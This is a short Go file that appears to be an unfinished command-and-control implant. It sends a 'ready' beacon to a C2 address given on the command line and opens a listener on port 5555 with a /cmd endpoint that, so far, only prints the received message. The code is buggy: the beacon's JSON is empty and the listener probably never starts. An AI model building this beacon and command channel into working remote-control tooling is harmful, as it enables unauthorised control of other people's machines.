package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
)

// port - 1234
func main() {
	ip_addr := flag.String("ip", "localhost", "ip addres of c2")
	//endpoint := flag.String("endpoint", "", "endpoint c2")

	flag.Parse()

	sendReadySignal(ip_addr)
	/*
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			fmt.Printf("err")
		}
		fmt.Printf(string(body))
		fmt.Printf("\n")
	*/
}
func sendReadySignal(ip *string) {
	c2_addr := "http://" + *ip + ":1234/ready"
	type readyStruct struct {
		ip string
	}
	rdy := readyStruct{
		ip: "localhost:5555",
	} //Create New packege with structs
	fmt.Printf(c2_addr)
	fmt.Printf("\n")

	b := new(bytes.Buffer)
	err := json.NewEncoder(b).Encode(rdy)
	if err != nil {
		return
	}

	resp, err := http.Post(c2_addr, "application/json", b)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	fmt.Println(resp.Status)
	/*
		var jsonData = []byte(`{
			"ip":"localhost:5555"
		}`)
			request, error := http.NewRequest("POST", c2_addr, bytes.NewBuffer(jsonData))
			request.Header.Set("Content-Type", "application/json; charset=UTF-8")

			client := &http.Client{}
			response, error := client.Do(request)
			if error != nil {
				panic(error)
			}
			defer response.Body.Close()

			fmt.Println("response Status:", response.Status)
			fmt.Println("response Headers:", response.Header)
			body, _ := ioutil.ReadAll(response.Body)
			fmt.Println("response Body:", string(body))
	*/
	go startServer()

}
func startServer() {
	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
		fmt.Printf(r.URL.Query().Get("m"))
	})

	http.ListenAndServe(":5555", nil)
}
